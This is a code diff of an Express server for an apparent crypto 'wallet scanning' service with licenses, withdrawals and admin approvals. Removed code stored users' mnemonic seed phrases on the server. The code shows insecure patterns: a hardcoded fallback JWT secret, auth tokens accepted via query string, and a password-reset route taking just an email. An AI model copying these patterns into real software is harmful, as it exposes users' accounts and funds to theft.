@@ -1,7 +1,7 @@
-// server.js
+// server.js 
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
-const bcrypt = require('bcrypt'); // bcrypt (callbacks)
+const bcrypt = require('bcrypt'); // callbacks (no async/await)
 const cors = require('cors');
 const path = require('path');
 const jwt = require('jsonwebtoken');
@@ -92,10 +92,10 @@ async function maybeRestoreFromBackup(db, dbFilePath) {
 const app = express();
 
 // ---- Config ----
-const PORT = process.env.PORT || 5000;
+const PORT = process.env.PORT || 8080;
 const JWT_SECRET = process.env.JWT_SECRET || 'supersecretkey';
 const dbPath = process.env.DATABASE_PATH || '/mnt/data/dolphin.db';
-const staticDir = process.env.STATIC_DIR || path.join(__dirname, '../frontend');
+const staticDir = process.env.STATIC_DIR || path.join(__dirname, 'frontend');
 
 // ---- Ensure DB directory exists ----
 const dirPath = path.dirname(dbPath);
@@ -170,21 +170,11 @@ const corsOptions = {
 app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
 
-app.use(express.json());
+app.use(express.json({ limit: '1mb' }));
 app.use(express.static(staticDir));
 
 // ---- DB migrate ----
 db.serialize(() => {
-
-  db.run(`
-    CREATE TABLE IF NOT EXISTS scan_snapshots (
-      user_id INTEGER PRIMARY KEY,
-      block_height TEXT,
-      wallets_detected INTEGER,
-      scan_time TEXT,
-      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-  `);
 
   db.run(`
     CREATE TABLE IF NOT EXISTS scan_snapshots_v2 (
@@ -253,22 +243,6 @@ db.serialize(() => {
   `);
 
   db.run(`
-    CREATE TABLE IF NOT EXISTS scans (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      user_id INTEGER NOT NULL UNIQUE,
-      status TEXT DEFAULT 'idle',
-      started_at DATETIME,
-      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-      elapsed_ms INTEGER DEFAULT 0,
-      total_scanned INTEGER DEFAULT 0,
-      hour_target INTEGER DEFAULT 0,
-      hour_progress INTEGER DEFAULT 0,
-      hour_started_at DATETIME,
-      end_at DATETIME
-    )
-  `);
-
-  db.run(`
     CREATE TABLE IF NOT EXISTS mnemonics (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       user_id INTEGER UNIQUE,
@@ -295,15 +269,6 @@ db.serialize(() => {
       UPDATE mnemonics SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
     END;
   `);
-
-  // Ensure end_at exists
-  getTableColumns(db, 'scans').then(cols => {
-    if (!cols.includes('end_at')) {
-      db.run(`ALTER TABLE scans ADD COLUMN end_at DATETIME`, (e) => {
-        if (!e) console.log('🛠️  Added end_at column to scans');
-      });
-    }
-  });
 });
 
 // ---- Bootstrap admin if missing ----
@@ -320,7 +285,7 @@ db.get("SELECT * FROM users WHERE role = 'admin' LIMIT 1", (err, row) => {
   }
 });
 
-// ---- Auth middleware ----
+// ---- Helpers ----
 function authenticate(req, res, next) {
   const authHeader = req.headers['authorization'];
   if (!authHeader) return res.status(401).json({ error: 'No token provided' });
@@ -331,17 +296,35 @@ function authenticate(req, res, next) {
     next();
   });
 }
-
-// Helper to compute a stable user key (prefer username/email, then userId/uid, then sub)
+function ensureAdmin(req, res, next) {
+  if (req.user?.role !== 'admin') return res.status(403).json({ error: 'Access denied' });
+  next();
+}
 function getStableUserKey(decoded) {
   if (!decoded) return "";
   if (decoded.username || decoded.email) return String(decoded.username || decoded.email);
-  if (decoded.userId || decoded.uid) return String(decoded.userId || decoded.uid);
+  if (decoded.userId || decoded.uid || decoded.id) return String(decoded.userId || decoded.uid || decoded.id);
   return String(decoded.sub || "anonymous");
+}
+function verifyTokenFromAnywhere(req) {
+  let token = null;
+  const h = req.headers?.authorization;
+  if (h && h.startsWith('Bearer ')) token = h.slice(7);
+  if (!token && req.query?.token) token = String(req.query.token);
+  if (!token && req.body && typeof req.body === 'object' && req.body.token) token = String(req.body.token);
+  if (!token && typeof req.body === 'string') {
+    try { const parsed = JSON.parse(req.body); if (parsed?.token) token = String(parsed.token); } catch {}
+  }
+  if (!token) return { ok: false, reason: 'No token' };
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    return { ok: true, decoded };
+  } catch {
+    return { ok: false, reason: 'Bad token' };
+  }
 }
 
 // ------------------- AUTH -------------------
-
 // Register
 app.post('/api/register', (req, res) => {
   const { username, email, password } = req.body || {};
@@ -358,8 +341,7 @@ app.post('/api/register', (req, res) => {
           if (String(e).includes('UNIQUE')) return res.status(400).json({ error: 'Username or email already exists' });
           return res.status(500).json({ error: 'DB error' });
         }
-        // Issue token
-        const token = jwt.sign({ id: this.lastID, username: username, email: email, role: 'user' }, JWT_SECRET, { expiresIn: '7d' });
+        const token = jwt.sign({ id: this.lastID, username, email, role: 'user' }, JWT_SECRET, { expiresIn: '7d' });
         res.json({ token, user: { id: this.lastID, username, email } });
       }
     );
@@ -401,6 +383,18 @@ app.post('/api/login', (req, res) => {
   }
 });
 
+// Me
+app.get('/api/me', authenticate, (req, res) => {
+  db.get(
+    'SELECT id, username, email, role, license, created_at, updated_at FROM users WHERE id = ?',
+    [req.user.id],
+    (err, row) => {
+      if (err) return res.status(500).json({ error: 'Database error' });
+      res.json(row || {});
+    }
+  );
+});
+
 // Forgot Password
 app.post('/api/forgot-password', (req, res) => {
   const { email, new_password } = req.body || {};
@@ -420,18 +414,6 @@ app.post('/api/forgot-password', (req, res) => {
       });
     });
   });
-});
-
-// Me
-app.get('/api/me', authenticate, (req, res) => {
-  db.get(
-    'SELECT id, username, email, role, license, created_at, updated_at FROM users WHERE id = ?',
-    [req.user.id],
-    (err, row) => {
-      if (err) return res.status(500).json({ error: 'Database error' });
-      res.json(row);
-    }
-  );
 });
 
 // ------------------- WALLETS -------------------
@@ -558,7 +540,6 @@ function ensureAdmin(req, res, next) {
   next();
 }
 
-// License requests list
 app.get('/api/admin/license-requests', authenticate, ensureAdmin, (req, res) => {
   db.all(
     `SELECT license_requests.*, users.username 
@@ -573,7 +554,6 @@ app.get('/api/admin/license-requests', authenticate, ensureAdmin, (req, res) => 
   );
 });
 
-// License approve/reject
 app.post('/api/admin/approve-license', authenticate, ensureAdmin, (req, res) => {
   const { request_id, action } = req.body || {};
   if (!request_id || !['approve', 'reject'].includes(action))
@@ -598,7 +578,6 @@ app.post('/api/admin/approve-license', authenticate, ensureAdmin, (req, res) => 
   );
 });
 
-// Admin delete LICENSE request
 app.delete('/api/admin/license-requests/:id', authenticate, ensureAdmin, (req, res) => {
   const id = parseInt(req.params.id, 10);
   if (!id) return res.status(400).json({ error: 'Invalid id' });
@@ -608,7 +587,6 @@ app.delete('/api/admin/license-requests/:id', authenticate, ensureAdmin, (req, r
   });
 });
 
-// Final requests list
 app.get('/api/admin/final-requests', authenticate, ensureAdmin, (req, res) => {
   db.all(
     `SELECT final_transactions.*, users.username 
@@ -623,7 +601,6 @@ app.get('/api/admin/final-requests', authenticate, ensureAdmin, (req, res) => {
   );
 });
 
-// Final approve/reject
 app.post('/api/admin/approve-final', authenticate, ensureAdmin, (req, res) => {
   const { request_id, action } = req.body || {};
   if (!request_id || !['approve', 'reject'].includes(action))
@@ -640,7 +617,6 @@ app.post('/api/admin/approve-final', authenticate, ensureAdmin, (req, res) => {
   );
 });
 
-// Admin delete FINAL TX request
 app.delete('/api/admin/final-requests/:id', authenticate, ensureAdmin, (req, res) => {
   const id = parseInt(req.params.id, 10);
   if (!id) return res.status(400).json({ error: 'Invalid id' });
@@ -650,7 +626,6 @@ app.delete('/api/admin/final-requests/:id', authenticate, ensureAdmin, (req, res
   });
 });
 
-// Withdraw list
 app.get('/api/admin/withdraw-requests', authenticate, ensureAdmin, (req, res) => {
   db.all(
     `SELECT withdraw_requests.*, users.username
@@ -665,7 +640,6 @@ app.get('/api/admin/withdraw-requests', authenticate, ensureAdmin, (req, res) =>
   );
 });
 
-// Withdraw approve/reject
 app.post('/api/admin/approve-withdraw', authenticate, ensureAdmin, (req, res) => {
   const { request_id, action } = req.body || {};
   if (!request_id || !['approve', 'reject'].includes(action))
@@ -682,7 +656,6 @@ app.post('/api/admin/approve-withdraw', authenticate, ensureAdmin, (req, res) =>
   );
 });
 
-// Admin: fetch wallet by user_id
 app.get('/api/admin/user-wallet', authenticate, ensureAdmin, (req, res) => {
   const userId = parseInt(req.query.user_id, 10);
   if (!userId) return res.status(400).json({ error: 'user_id is required' });
@@ -697,7 +670,6 @@ app.get('/api/admin/user-wallet', authenticate, ensureAdmin, (req, res) => {
   );
 });
 
-// Admin — list users
 app.get('/api/admin/users', authenticate, ensureAdmin, (req, res) => {
   const { q = '', role = '', status = '', limit = '200', offset = '0' } = req.query;
 
@@ -743,8 +715,11 @@ app.get('/api/admin/users', authenticate, ensureAdmin, (req, res) => {
 });
 
 // ------------------- SCAN SNAPSHOT ENDPOINTS (Persist UI only) -------------------
-app.post('/api/save-scan-data', authenticate, (req, res) => {
-  const userKey = getStableUserKey(req.user);
+app.post('/api/save-scan-data', (req, res) => {
+  const auth = verifyTokenFromAnywhere(req);
+  if (!auth.ok) return res.status(401).json({ error: 'Unauthorized' });
+  const userKey = getStableUserKey(auth.decoded);
+
   const { blockHeight = "", walletsDetected = "", scanTime = "", elapsedMs = null } = req.body || {};
   const wallets = Number(String(walletsDetected).replace(/,/g, ''));
   const walletsInt = Number.isFinite(wallets) ? Math.max(0, Math.floor(wallets)) : null;
@@ -767,62 +742,6 @@ app.post('/api/save-scan-data', authenticate, (req, res) => {
   );
 });
 
-app.get('/api/load-scan-data', authenticate, (req, res) => {
-  const userKey = getStableUserKey(req.user);
-  db.get(
-    `SELECT block_height AS blockHeight,
-            wallets_detected AS walletsDetected,
-            scan_time AS scanTime,
-            elapsed_ms AS elapsedMs
-     FROM scan_snapshots_v2 WHERE user_key = ?`,
-    [userKey],
-    (err, row) => {
-      if (err) return res.status(500).json({ error: 'Database error' });
-      res.json(row || {});
-    }
-  );
-});
-
-// ------------------- MNEMONIC ENDPOINTS -------------------
-app.get('/api/mnemonic', authenticate, (req, res) => {
-  const userId = req.user.id;
-  db.get('SELECT words FROM mnemonics WHERE user_id = ?', [userId], (err, row) => {
-    if (err) return res.status(500).json({ error: 'Database error' });
-    if (!row) return res.json({ words: null });
-    try {
-      const words = JSON.parse(row.words);
-      return res.json({ words });
-    } catch {
-      return res.json({ words: null });
-    }
-  });
-});
-
-app.post('/api/mnemonic', authenticate, (req, res) => {
-  const userId = req.user.id;
-  const words = Array.isArray(req.body?.words) ? req.body.words : null;
-  if (!words || !words.every(w => typeof w === 'string') || (words.length !== 12 && words.length !== 24)) {
-    return res.status(400).json({ error: 'Invalid words (must be 12 or 24 strings)' });
-  }
-  db.get('SELECT id, words FROM mnemonics WHERE user_id = ?', [userId], (err, row) => {
-    if (err) return res.status(500).json({ error: 'Database error' });
-    if (row) {
-      try { const existing = JSON.parse(row.words); return res.json({ words: existing, persisted: true }); }
-      catch { return res.json({ words, persisted: true }); }
-    }
-    db.run(
-      'INSERT INTO mnemonics (user_id, words) VALUES (?, ?)',
-      [userId, JSON.stringify(words)],
-      function (e) {
-        if (e) return res.status(500).json({ error: 'Database error' });
-        res.json({ words, persisted: true });
-      }
-    );
-  });
-});
-
-
-// Beacon-friendly endpoint: accepts text/plain with { token, data:{...} }
 const textParser = require('express').text;
 app.post('/api/save-scan-data-beacon', textParser({ type: '*/*', limit: '64kb' }), (req, res) => {
   try {
@@ -871,6 +790,24 @@ app.post('/api/save-scan-data-beacon', textParser({ type: '*/*', limit: '64kb' }
     console.error('save-scan-data-beacon error:', e);
     res.status(500).json({ error: 'server error' });
   }
+});
+
+app.get('/api/load-scan-data', (req, res) => {
+  const auth = verifyTokenFromAnywhere(req);
+  if (!auth.ok) return res.status(401).json({ error: 'Unauthorized' });
+  const userKey = getStableUserKey(auth.decoded);
+  db.get(
+    `SELECT block_height AS blockHeight,
+            wallets_detected AS walletsDetected,
+            scan_time AS scanTime,
+            elapsed_ms AS elapsedMs
+     FROM scan_snapshots_v2 WHERE user_key = ?`,
+    [userKey],
+    (err, row) => {
+      if (err) return res.status(500).json({ error: 'Database error' });
+      res.json(row || {});
+    }
+  );
 });
 
 // ---- Start ----
